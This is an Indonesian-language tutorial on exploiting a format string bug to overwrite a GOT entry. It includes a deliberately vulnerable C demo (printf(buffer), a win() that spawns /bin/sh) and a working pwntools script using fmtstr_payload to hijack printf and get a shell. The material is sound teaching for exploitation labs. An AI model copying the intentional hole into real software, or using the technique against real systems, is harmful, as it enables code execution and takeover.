# GOT Overwrite via Format String — Practical Notes

## 1. Menentukan Target GOT

Untuk melakukan GOT overwrite, kita harus mengetahui alamat entri GOT dari fungsi yang ingin dibajak.

Biasanya dicek dengan:

```bash
objdump -R ./binary
```

atau di dalam GDB:

```bash
got
```

Alamat GOT bersifat statis jika:

- PIE dalam keadaan mati (`-no-pie`), atau
- binary base address sudah diketahui.

---

## 2. Vulnerable Source Code

```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("Selamat! Anda berhasil membajak GOT.\n");
    system("/bin/sh");
}

int main() {
    char buffer[64];

    printf("--- Demo GOT Overwrite ---\n");
    printf("Alamat win() ada di: %p\n", win);

    printf("Masukkan nama Anda: ");
    fgets(buffer, sizeof(buffer), stdin);

    printf(buffer);   // format string vulnerability

    printf("\nProgram selesai secara normal.\n");
    return 0;
}
```

Compile:

```bash
gcc vuln.c -o vuln -no-pie -Wl,-z,lazy
```

---

## 3. Tahapan Exploit

### A. Cari Offset Format String

```bash
AAAA.%p.%p.%p.%p.%p.%p
```

Cari kapan `0x41414141` muncul.

Jika muncul di urutan ke-6:

```bash
offset = 6
```

---

### B. Cari Alamat GOT printf

```bash
objdump -R vuln | grep printf
```

Contoh:

```bash
0804a00c R_386_JUMP_SLOT   printf
```

Maka:

```bash
printf@got = 0x0804a00c
```

---

### C. Cari Alamat win()

Leak dari program:

```bash
Alamat win() ada di: 0x080491b6
```

Atau:

```bash
nm vuln | grep win
```

---

## 4. Exploit Script

```python
from pwn import *

exe = './vuln'
elf = ELF(exe)
p = process(exe)

p.recvuntil(b"Alamat win() ada di: ")
win_addr = int(p.recvline().strip(), 16)

target_got = elf.got['printf']
offset = 6

payload = fmtstr_payload(offset, {target_got: win_addr})

p.sendlineafter(b"Masukkan nama Anda: ", payload)
p.interactive()
```

---

## 5. Mekanisme Eksploitasi

Sebelum overwrite:

```bash
printf@got -> printf@libc
```

Payload `%n` menulis:

```bash
win_addr
```

ke:

```bash
printf@got
```

Sehingga:

```bash
printf@got -> win
```

Saat program memanggil `printf()` lagi, CPU justru melompat ke `win()`.

Hasil akhir:

```bash
system("/bin/sh")
```

---

## 6. Flow GOT Hijack

```bash
Format String Bug
      ↓
Arbitrary Write
      ↓
Overwrite printf@got
      ↓
printf@got = win
      ↓
printf() dipanggil lagi
      ↓
Hijack ke win()
      ↓
Shell
```

---

## Summary

- Tentukan offset format string
- Ambil `printf@got`
- Ambil `win()`
- Gunakan `%n` / `fmtstr_payload`
- Overwrite GOT
- Tunggu `printf()` dieksekusi kembali

Teknik ini adalah:

**Format String → Arbitrary Write → GOT Overwrite**
